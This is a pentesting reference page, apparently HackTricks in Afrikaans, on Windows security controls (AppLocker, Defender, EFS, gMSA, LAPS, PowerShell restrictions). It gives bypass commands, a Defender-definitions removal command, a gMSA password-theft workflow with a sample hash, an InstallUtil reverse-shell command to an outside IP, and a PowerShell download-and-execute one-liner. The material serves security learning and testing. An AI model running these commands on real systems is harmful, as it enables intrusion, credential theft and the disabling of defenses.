# Windows Sekuriteitskontroles

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassings-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel teenwoordig mag wees en uitgevoer kan word. Die doel is om die omgewing te beskerm teen skadelike malware en ongeakkrediteerde sagteware wat nie by die spesifieke sakebehoeftes van 'n organisasie pas nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **oplossing vir toepassings-witlyste** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fyn beheer** oor uitvoerbare lêers, skripte, Windows installer-lêers, DLLs, packaged apps, en packed app installers.  
Dit is algemeen dat organisasies **blokkeer cmd.exe en PowerShell.exe** en skryftoegang tot sekere gidse beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word en bied 'n manier om die huidige stel reëls wat op die stelsel afgedwing word, na te gaan:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **Writable folders** om AppLocker Policy te bypass: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer kan word, is daar **writable folders** wat jy kan gebruik om **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen vertroude [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Sleg opgestelde reëls kan ook omseil word**
- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, jy kan 'n **gids genaamd `allowed`** enige plek skep en dit sal toegelaat word.
- Organisasies fokus dikwels op die blokkeer van die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement word baie selde geaktiveer** as gevolg van die ekstra las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Daarom sal die gebruik van **DLLs as backdoors** help om AppLocker te omseil.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om PowerShell-code in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Lokale kredensiale is in hierdie lêer teenwoordig, die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **kredensiale** (gehash) word **gestoor** in die **geheue** van hierdie substelsel vir Single Sign-On redes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikerstoestemmings...), **verifikasie**, **toegangstokens**...\
LSA sal die een wees wat die verskafde kredensiale binne die **SAM**-lêer (vir 'n plaaslike aanmelding) sal **kontroleer** en met die **domain controller** sal **kommunikeer** om 'n domeingebruiker te verifieer.

Die **kredensiale** word **gestoor** binne die **proses LSASS**: Kerberos tickets, NT- en LM-hashes, maklik ontsleutelde wagwoorde.

### LSA secrets

LSA kan sommige kredensiale op skyf stoor:

- Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domain controller).
- Wagwoorde van die rekeninge van Windows-dienste
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs teenwoordig op Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is 'n antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows Server. Dit **blokkeer** algemene pentesting-instrumente soos **`WinPEAS`**. Daar is egter maniere om hierdie beskermings te omseil.

### Check

Om die **status** van **Defender** te kontroleer kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kyk na die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumereer kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Gekodeerde Lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie en gebruik 'n **simbetriese sleutel** wat bekend staan as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **public key** opgesluit en in die $EFS **alternatiewe datastroom** van die gekodeerde lêer gestoor. Wanneer ontsleuteling nodig is, word die ooreenstemmende **private key** van die gebruiker se digitale sertifikaat gebruik om die FEK vanuit die $EFS-stroom te ontsluit. Meer besonderhede is beskikbaar [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Ontsleutelingsscenario's sonder gebruikersinitiasie** sluit in:

- Wanneer lêers of vouers na 'n nie-EFS lêerstelsel geskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), word hulle outomaties ontsluit.
- Gekodeerde lêers wat oor die netwerk via SMB/CIFS gestuur word, word voor transmissie ontsluit.

Hierdie enkripsiemetode laat toe vir **deursigtige toegang** tot gekodeerde lêers vir die eienaar. Tog sal dit nie volstaan om bloot die eienaar se wagwoord te verander en aan te teken om ontsleuteling moontlik te maak nie.

Belangrike punte:

- EFS gebruik 'n simmetriese FEK, wat met die gebruiker se public key geënkripteer word.
- Ontsleuteling gebruik die gebruiker se private key om by die FEK uit te kom.
- Outomatiese ontsleuteling gebeur onder spesifieke toestande, soos kopieer na FAT32 of netwerktransmissie.
- Gekodeerde lêers is vir die eienaar toeganklik sonder addisionele stappe.

### Kontroleer EFS-inligting

Kontroleer of 'n **gebruiker** hierdie **diens** gebruik het deur te kyk of hierdie pad bestaan: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** toegang tot die lêer het met `cipher /c \<file\>`  
Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om al die lêers te **enkripteer** en **ontsleutel**.

### Ontsleuteling van EFS-lêers

#### SYSTEM-bevoegdheid

Hierdie metode vereis dat die **slagoffergebruik­er** 'n **proses** op die gasheer laat loop. As dit die geval is, kan jy met 'n `meterpreter`-sessie die token van die proses van die gebruiker imiteer (`impersonate_token` van `incognito`). Of jy kan net na die proses van die gebruiker `migrate`.

#### Om die gebruiker se wagwoord te ken


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Groep Beheerde Service-rekeninge (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van service-rekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele service-rekeninge wat dikwels die instelling "**Password never expire**" opgesit het, bied gMSAs 'n veiliger en meer bestuurbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSAs gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens domein- of rekenaarbeleid. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde veiligheid**: Hierdie rekeninge is immuun vir lockouts en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul veiligheid verhoog.
- **Meervoudige gasheerondersteuning**: gMSAs kan oor verskeie gasheer gedeel word, wat dit ideaal maak vir dienste wat op veelvuldige bedieners loop.
- **Geskeduleerde Taak-ondersteuning**: Anders as managed service accounts, ondersteun gMSAs die uitvoering van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties by wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSAs word in die LDAP-eiendom _**msDS-ManagedPassword**_ gestoor en word outomaties elke 30 dae deur Domain Controllers (DCs) gereset. Hierdie wagwoord, 'n enkripteerde datablik bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSAs geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om by hierdie inligting uit te kom, is 'n gesekuriseerde verbinding soos LDAPS vereis, of die verbinding moet geverifieer wees met 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### Misbruik van ACL-chaining om gMSA-beheerde wagwoord te lees (GenericAll -> ReadGMSAPassword)

In baie omgewings kan laag-geprivilegieerde gebruikers na gMSA-geheime skuif sonder om die DC te kompromitteer deur misgekonfigureerde object ACLs te misbruik:

- ’n groep wat jy kan beheer (bv. via GenericAll/GenericWrite) kry toegeken `ReadGMSAPassword` oor ’n gMSA.
- Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword` blob oor LDAP te lees en bruikbare NTLM credentials af te lei.

Tipiese werkvloei:

1) Vind die pad met BloodHound en merk jou foothold-prinsipale as Owned. Soek vir kante soos:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Voeg jouself by die tussengroep wat jy beheer (voorbeeld met bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lees die gMSA-beheerde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die onttrekking van `msDS-ManagedPassword` en die omskakeling na NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Verifieer as die gMSA deur die NTLM hash te gebruik (no plaintext needed). As die rekening in Remote Management Users is, sal WinRM direk werk:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP-lesings van `msDS-ManagedPassword` vereis sealing (bv., LDAPS/sign+seal). Tools hanteer dit outomaties.
- gMSAs kry dikwels plaaslike regte soos WinRM; valideer groepslidmaatskap (bv., Remote Management Users) om lateral movement te beplan.
- As jy net die blob nodig het om self die NTLM te bereken, sien MSDS-MANAGEDPASSWORD_BLOB struktuur.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **willekeurig** gegenereer, uniek, en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot geautoriseerde gebruikers beperk. Met voldoende bevoegdhede toegestaan, word die vermoë gebied om plaaslike admin-wagwoorde te lees.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **beperk baie van die funksies** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, slegs goedgekeurde .NET-tipes toelaat, XAML-gebaseerde workflows, PowerShell-klasse, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\  
**Om dit te kompileer mag jy** **om** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **execute Powershell** code in enige proses uit te voer en die constrained mode te bypass. Vir meer info sien: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Uitvoeringsbeleid

Standaard is dit gestel op **restricted.** Hoof maniere om hierdie beleid te bypass:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer inligting is beskikbaar [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Dit is die API wat gebruik kan word om gebruikers te verifieer.

Die SSPI is verantwoordelik om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Die SSPI sal dan onderhandel watter authentication protocol gebruik sal word; hierdie authentication protocols word Security Support Provider (SSP) genoem, is in elke Windows-masjien in die vorm van 'n DLL geleë, en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.

### Main SSPs

- **Kerberos**: Die voorkeur
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: vir versoenbaarheidsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webservers en LDAP; wagwoord in die vorm van 'n MD5-hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Word gebruik om die protokol te onderhandel wat gebruik gaan word (Kerberos of NTLM, met Kerberos as die verstek)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een aanbied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsprompt vir aktiwiteite met verhoogde regte** moontlik maak.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
